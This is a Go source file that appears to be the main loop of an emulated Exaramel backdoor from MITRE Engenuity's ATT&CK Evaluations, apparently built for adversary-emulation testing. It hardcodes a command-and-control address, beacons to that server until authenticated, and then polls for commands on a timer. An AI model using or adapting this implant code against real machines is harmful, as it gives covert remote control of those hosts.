package main

import (
	"flag"
	"os"
	"time"

	"attackevals.mitre-engenuity.org/exaramel/configur"
	"attackevals.mitre-engenuity.org/exaramel/logger"
	"attackevals.mitre-engenuity.org/exaramel/networker"
	"attackevals.mitre-engenuity.org/exaramel/scheduler"
)

// Main loop, initializes configuration, sends initial authentication beacon, and then starts main loop.
func main() {
	c2Addr := "192.168.0.4:8443"
	urlPtr := flag.String("server", c2Addr, "The C2 Server's URL")
	intervalPtr := flag.Int("interval", 15, "The interval between command loops in seconds")
	flag.Parse()
	cronString := scheduler.CreateCronStringFromSeconds(*intervalPtr)

	logger.Info("Setting C2Server to: " + *urlPtr)
	sock, err := configur.Initialize(*urlPtr)
	if err != nil {
		logger.Error(err)
		sock.Close()
		os.Exit(-1)
	}
	connected_to_server := false
	for connected_to_server == false {
		if err := networker.PostAuthBeacon(); err != nil {
			logger.Error(err)
			time.Sleep(5 * time.Second)
		} else {
			connected_to_server = true
		}
	}
	logger.Success("Authenticated to server")

	if err := scheduler.SetupScheduler(cronString); err != nil {
		logger.Error(err)
		sock.Close()
		os.Exit(-1)
	}
	scheduler.StartLoop()
	for {
		time.Sleep(1 * time.Second)
	}
}
